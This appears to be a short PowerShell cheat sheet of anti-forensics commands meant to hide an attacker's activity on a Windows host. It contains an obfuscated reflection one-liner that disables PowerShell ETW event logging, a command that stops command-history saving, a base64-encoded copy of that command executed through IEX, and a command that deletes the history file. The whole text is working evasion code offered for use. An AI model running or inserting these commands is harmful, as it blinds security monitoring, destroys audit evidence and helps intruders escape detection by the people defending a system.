# Logging bypass:
(({}).gettype())."aSs`emblY"."Getty`PE"(('System.Manage'+'ment.Automati'+'on.Trac'+'ing.P'+'SEtwL'+'og'+'Pro'+'vi'+'d'+'e'+'r'))."gEtf`ieLD"(('etwProvi'+'de'+'r'),('Non'+'P'+'ublic,Static'))."Se`TVAL`Ue"($null,(New-Object System.Diagnostics.Eventing.EventProvider(New-Guid)))

# Neuter Writes to History Log:
Set-PSReadlineOption -HistorySaveStyle SaveNothing

# Encoded version of blocking writes to history
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('UwBlAHQALQBQAFMAUgBlAGEAZABsAGkAbgBlAE8AcAB0AGkAbwBuACAALQBIAGkAcwB0AG8AcgB5AFMAYQB2AGUAUwB0AHkAbABlACAAUwBhAHYAZQBOAG8AdABoAGkAbgBnAA==')) | IEX

# Delete history logs
rm (Get-PSReadlineOption).HistorySavePath
